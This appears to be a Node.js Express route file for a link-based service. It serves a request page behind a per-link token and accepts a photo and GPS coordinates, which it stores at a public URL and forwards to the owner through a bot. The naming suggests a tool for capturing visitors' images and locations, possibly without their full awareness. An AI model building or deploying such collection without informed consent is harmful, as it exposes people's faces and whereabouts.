import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { verifyToken } from '../lib/security.js';
import { notifyOwnerCapture } from '../bot.js';

const router = express.Router();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const uploadRoot = path.join(__dirname, '../../uploads');
if (!fs.existsSync(uploadRoot)) fs.mkdirSync(uploadRoot, { recursive: true });

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const id = req.params.id || 'unknown';
    const dir = path.join(uploadRoot, id);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const safe = `${Date.now()}_${(file.originalname || 'photo').replace(/[^\w.\-]+/g, '_')}`;
    cb(null, safe);
  }
});
const upload = multer({ storage });

router.get('/:id', (req, res) => {
  const { token } = req.query;
  const data = verifyToken(token, process.env.JWT_SECRET);
  if (!data || data.id !== req.params.id) {
    return res.status(401).send('الرابط منتهي أو غير صالح.');
  }
  res.sendFile(path.join(__dirname, '../../public/request.html'));
});

router.post('/upload/:id', upload.single('photo'), async (req, res) => {
  const { token } = req.query;
  const data = verifyToken(token, process.env.JWT_SECRET);
  if (!data || data.id !== req.params.id) {
    return res.status(401).send('الرابط منتهي أو غير صالح.');
  }

  const { latitude, longitude } = req.body;
  if (!req.file) return res.status(400).send('لم تُرفع صورة.');

  const publicBase = `${process.env.SERVER_URL}/uploads/${encodeURIComponent(req.params.id)}`;
  const photoUrl = `${publicBase}/${encodeURIComponent(req.file.filename)}`;

  const text =
`طلب جديد: ${req.params.id}
الموقع: ${latitude}, ${longitude}
الوقت: ${new Date().toLocaleString('ar-SA')}`;

  await notifyOwnerCapture({ text, photoUrl });
  res.send('تم الإرسال. شكرًا لمشاركتك.');
});

export default router;
